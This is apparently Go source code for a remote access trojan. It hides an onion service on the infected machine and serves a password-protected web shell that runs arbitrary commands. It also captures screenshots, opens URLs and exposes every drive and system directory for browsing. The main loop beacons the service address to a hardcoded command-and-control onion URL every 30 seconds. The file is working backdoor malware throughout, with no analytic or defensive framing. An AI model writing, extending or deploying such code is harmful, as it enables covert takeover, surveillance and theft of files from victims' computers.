package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"image/png"
	"io/ioutil"
	"log"
	mr "math/rand"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
	"unicode/utf8"

	"github.com/cretz/bine/tor"
	// libtor "github.com/ipsn/go-libtor"
	// "github.com/cretz/bine/process/embedded"
	"github.com/clementauger/tor-prebuilt/embedded"

	"github.com/kbinani/screenshot"
	"github.com/schollz/httpfileserver"
	"github.com/skratchdot/open-golang/open"
)

const (
	PASSWORD = "toor"
	cc       = "http://hz3rfqrugxvwy3vl.onion/cc"
)

var (
	UnterminatedSingleQuoteError = errors.New("Unterminated single-quoted string")
	UnterminatedDoubleQuoteError = errors.New("Unterminated double-quoted string")
	UnterminatedEscapeError      = errors.New("Unterminated backslash-escape")
)

var (
	splitChars        = " \n\t"
	singleChar        = '\''
	doubleChar        = '"'
	escapeChar        = '\\'
	doubleEscapeChars = "$`\"\n\\"
)

func Split(input string) (words []string, err error) {
	var buf bytes.Buffer
	words = make([]string, 0)

	for len(input) > 0 {
		// skip any splitChars at the start
		c, l := utf8.DecodeRuneInString(input)
		if strings.ContainsRune(splitChars, c) {
			input = input[l:]
			continue
		}

		var word string
		word, input, err = splitWord(input, &buf)
		if err != nil {
			return
		}
		words = append(words, word)
	}
	return
}

func splitWord(input string, buf *bytes.Buffer) (word string, remainder string, err error) {
	buf.Reset()

raw:
	{
		cur := input
		for len(cur) > 0 {
			c, l := utf8.DecodeRuneInString(cur)
			cur = cur[l:]
			if c == singleChar {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				input = cur
				goto single
			} else if c == doubleChar {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				input = cur
				goto double
			} else if c == escapeChar {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				input = cur
				goto escape
			} else if strings.ContainsRune(splitChars, c) {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				return buf.String(), cur, nil
			}
		}
		if len(input) > 0 {
			buf.WriteString(input)
			input = ""
		}
		goto done
	}

escape:
	{
		if len(input) == 0 {
			return "", "", UnterminatedEscapeError
		}
		c, l := utf8.DecodeRuneInString(input)
		if c == '\n' {
		} else {
			buf.WriteString(input[:l])
		}
		input = input[l:]
	}
	goto raw

single:
	{
		i := strings.IndexRune(input, singleChar)
		if i == -1 {
			return "", "", UnterminatedSingleQuoteError
		}
		buf.WriteString(input[0:i])
		input = input[i+1:]
		goto raw
	}

double:
	{
		cur := input
		for len(cur) > 0 {
			c, l := utf8.DecodeRuneInString(cur)
			cur = cur[l:]
			if c == doubleChar {
				buf.WriteString(input[0 : len(input)-len(cur)-l])
				input = cur
				goto raw
			} else if c == escapeChar {
				c2, l2 := utf8.DecodeRuneInString(cur)
				cur = cur[l2:]
				if strings.ContainsRune(doubleEscapeChars, c2) {
					buf.WriteString(input[0 : len(input)-len(cur)-l-l2])
					if c2 == '\n' {
					} else {
						buf.WriteRune(c2)
					}
					input = cur
				}
			}
		}
		return "", "", UnterminatedDoubleQuoteError
	}

done:
	return buf.String(), input, nil
}

func GenerateRsaKeyPair() (*rsa.PrivateKey, *rsa.PublicKey) {
	privkey, _ := rsa.GenerateKey(rand.Reader, 1024)
	return privkey, &privkey.PublicKey
}

func ExportRsaPrivateKeyAsPemStr(privkey *rsa.PrivateKey) string {
	privkey_bytes := x509.MarshalPKCS1PrivateKey(privkey)
	privkey_pem := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PRIVATE KEY",
			Bytes: privkey_bytes,
		},
	)
	return string(privkey_pem)
}

func ParseRsaPrivateKeyFromPemStr(privPEM string) (*rsa.PrivateKey, error) {
	block, _ := pem.Decode([]byte(privPEM))
	if block == nil {
		return nil, errors.New("failed to parse PEM block containing the key")
	}

	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	return priv, nil
}

func ExportRsaPublicKeyAsPemStr(pubkey *rsa.PublicKey) (string, error) {
	pubkey_bytes, err := x509.MarshalPKIXPublicKey(pubkey)
	if err != nil {
		return "", err
	}
	pubkey_pem := pem.EncodeToMemory(
		&pem.Block{
			Type:  "RSA PUBLIC KEY",
			Bytes: pubkey_bytes,
		},
	)

	return string(pubkey_pem), nil
}

func ParseRsaPublicKeyFromPemStr(pubPEM string) (*rsa.PublicKey, error) {
	block, _ := pem.Decode([]byte(pubPEM))
	if block == nil {
		return nil, errors.New("failed to parse PEM block containing the key")
	}

	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	switch pub := pub.(type) {
	case *rsa.PublicKey:
		return pub, nil
	default:
		break // fall through
	}
	return nil, errors.New("Key type is not RSA")
}

func run_cmd(s string) string {

	fmt.Println("exec:", s)

	args, _ := Split(s)

	cmd := exec.Command(args[0], args[1:]...)

	var out bytes.Buffer
	var errorOutput bytes.Buffer

	cmd.Stdout = &out
	cmd.Stderr = &errorOutput

	err2 := cmd.Run()

	outputString := out.String()

	if err2 != nil {
		log.Println(err2)
		return errorOutput.String()
	}

	outputString = strings.Replace(outputString, "\n", "<br />", -1)

	return outputString

}

func serverStart(id chan string, torch chan *tor.Tor) {

	priv := &rsa.PrivateKey{}
	pub := &rsa.PublicKey{}
	if _, err := os.Stat("privateuser.key"); os.IsNotExist(err) {
		priv, pub = GenerateRsaKeyPair()
		// Export the keys to pem string
		priv_pem := ExportRsaPrivateKeyAsPemStr(priv)
		pub_pem, _ := ExportRsaPublicKeyAsPemStr(pub)

		// Import the keys from pem string
		priv_parsed, _ := ParseRsaPrivateKeyFromPemStr(priv_pem)
		pub_parsed, _ := ParseRsaPublicKeyFromPemStr(pub_pem)

		// Export the newly imported keys
		priv_parsed_pem := ExportRsaPrivateKeyAsPemStr(priv_parsed)
		pub_parsed_pem, _ := ExportRsaPublicKeyAsPemStr(pub_parsed)

		fmt.Println(priv_parsed_pem)
		fmt.Println(pub_parsed_pem)

		// Check that the exported/imported keys match the original keys
		if priv_pem != priv_parsed_pem || pub_pem != pub_parsed_pem {
			fmt.Println("Failure: Export and Import did not result in same Keys")
		} else {
			fmt.Println("Success")
		}
		err := ioutil.WriteFile("privateuser.key", []byte(priv_pem), 0644)
		if err != nil {
			panic(err)
		}
		err = ioutil.WriteFile("publicuser.key", []byte(pub_pem), 0644)
		if err != nil {
			panic(err)
		}

	} else {
		priv_pem, err := ioutil.ReadFile("privateuser.key")
		if err != nil {
			panic(err)
		}
		pub_pem, err := ioutil.ReadFile("publicuser.key")
		if err != nil {
			panic(err)
		}

		priv, _ = ParseRsaPrivateKeyFromPemStr(string(priv_pem))
		pub, _ = ParseRsaPublicKeyFromPemStr(string(pub_pem))
	}

	// Start tor with default config (can set start conf's DebugWriter to os.Stdout for debug logs)
	fmt.Println("Starting and registering onion service, please wait a couple of minutes...")

	t, err := tor.Start(nil, &tor.StartConf{ProcessCreator: embedded.NewCreator()})
	if err != nil {
		return
	}
	defer t.Close()
	// Add a handler
	http.HandleFunc("/sh/", func(w http.ResponseWriter, r *http.Request) {
		cmd := `<html>
		<body>
			<form method="POST" action="/sh/" target="_top">
				CMD:
				<input name="cmd">
				PW:
				<input name="password" type="password">
				<button type="submit">Go</button>
			</form>
			%s
			</body>
		</html>`
		if r.Method == http.MethodPost {
			if r.FormValue("password") == PASSWORD {
				w.Write([]byte(fmt.Sprintf(cmd, run_cmd(r.FormValue("cmd")))))
			} else {
				w.Write([]byte("NOPE.avi"))
			}
		} else if r.Method == http.MethodGet {
			w.Write([]byte(fmt.Sprintf(cmd, "")))
		}
	})
	http.HandleFunc("/open/", func(w http.ResponseWriter, r *http.Request) {
		cmd := `<html>
		<body>
			<form method="POST" action="/open/" target="_top">
				URL:
				<input name="cmd">
				PW:
				<input name="password" type="password">
				<button type="submit">Go</button>
			</form>
			%s
			</body>
		</html>`
		if r.Method == http.MethodPost {
			if r.FormValue("password") == PASSWORD {
				// w.Write([]byte(fmt.Sprintf(cmd, run_cmd(r.FormValue("cmd")))))
				w.Write([]byte(fmt.Sprintf(cmd, open.Run(r.FormValue("cmd")))))
			} else {
				w.Write([]byte("NOPE.avi"))
			}
		} else if r.Method == http.MethodGet {
			w.Write([]byte(fmt.Sprintf(cmd, "")))
		}
	})
	http.HandleFunc("/screen/", func(w http.ResponseWriter, r *http.Request) {
		img, err := screenshot.CaptureDisplay(0)
		if err != nil {
			w.Write([]byte(fmt.Sprint(err)))
		}
		w.Write([]byte("<html><body><img src=\"data:image/png;base64,"))
		e := base64.NewEncoder(base64.StdEncoding, w)
		err = png.Encode(e, img)
		if err != nil {
			w.Write([]byte(fmt.Sprint(err)))
		}
		w.Write([]byte("\"></body></html>"))
	})
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte(`<html>Hello dark world: 
		<a href="/sh">Shell</a>
		<a href="/screen">screen 0</a>
		<a href="/open">Open URI</a>
		<a href="/root">/</a>
		<a href="/home">/home</a>
		<a href="usr">/usr</a>
		<a href="var">/var</a>
		<a href="tmp">/tmp</a>
		<a href="C">C:/</a>
		<a href="D">D:/</a>
		<a href="E">E:/</a>
		<a href="F">F:/</a>
		<a href="G">G:/</a>
		<a href="H">H:/</a>
		<a href="I">I:/</a>
		<a href="J">J:/</a>
		<a href="K">K:/</a>
		<a href="L">L:/</a>
		<a href="M">M:/</a>
		<a href="N">N:/</a>
		<a href="O">O:/</a>
		<a href="P">P:/</a>
		`))
	})
	http.Handle("/root/", httpfileserver.New("/", "/").Handle())
	http.Handle("/home/", httpfileserver.New("/home/", "/home/").Handle())
	http.Handle("/C", httpfileserver.New("/C", "C:/").Handle())
	http.Handle("/D", httpfileserver.New("/D", "D:/").Handle())
	http.Handle("/E", httpfileserver.New("/E", "E:/").Handle())
	http.Handle("/F", httpfileserver.New("/F", "F:/").Handle())
	http.Handle("/G", httpfileserver.New("/G", "G:/").Handle())
	http.Handle("/H", httpfileserver.New("/H", "H:/").Handle())
	http.Handle("/I", httpfileserver.New("/I", "I:/").Handle())
	http.Handle("/J", httpfileserver.New("/J", "J:/").Handle())
	http.Handle("/K", httpfileserver.New("/K", "K:/").Handle())
	http.Handle("/L", httpfileserver.New("/L", "L:/").Handle())
	http.Handle("/M", httpfileserver.New("/M", "M:/").Handle())
	http.Handle("/N", httpfileserver.New("/N", "N:/").Handle())
	http.Handle("/O", httpfileserver.New("/O", "O:/").Handle())
	http.Handle("/P", httpfileserver.New("/P", "P:/").Handle())
	http.Handle("/usr", httpfileserver.New("/usr", "/usr").Handle())
	http.Handle("/var", httpfileserver.New("/var", "/var").Handle())
	http.Handle("/tmp", httpfileserver.New("/tmp", "/tmp").Handle())
	listenCtx, _ := context.WithTimeout(context.Background(), 300*time.Hour)
	mr.Seed(time.Now().UnixNano())
	port := mr.Int31()
	onion, err := t.Listen(listenCtx, &tor.ListenConf{Version3: true, LocalPort: int(port)%(1<<15) + 1000, Key: priv, RemotePorts: []int{80}})
	if err != nil {
		return
	}
	id <- onion.ID
	torch <- t
	fmt.Printf("Open Tor browser and navigate to http://%v.onion\n", onion.ID)
	// PostToURL(cc, t, []byte(fmt.Sprintf("http://%v.onion", onion.ID)))
	http.Serve(onion, nil)
}

func main() {
	c := make(chan string, 1)
	t := make(chan *tor.Tor, 1)
	go serverStart(c, t)
	onionid := <-c
	tor := <-t
	for {
		fmt.Println(PostToURL(cc, tor, []byte(onionid)))
		<-time.After(30 * time.Second)
		fmt.Println("here we go")
	}
}

func PostToURL(cc string, t *tor.Tor, data []byte) (string, error) {
	dialCtx, dialCancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer dialCancel()
	// Make connection
	dialer, err := t.Dialer(dialCtx, nil)
	if err != nil {
		return "", err
	}
	httpClient := &http.Client{Transport: &http.Transport{DialContext: dialer.DialContext}}
	// Wait at most a minute to start network and get
	values := map[string]string{"self": string(data)}

	jsonValue, _ := json.Marshal(values)

	resp, err := httpClient.Post(cc, "application/json", bytes.NewBuffer(jsonValue))
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	return string(body), nil
}
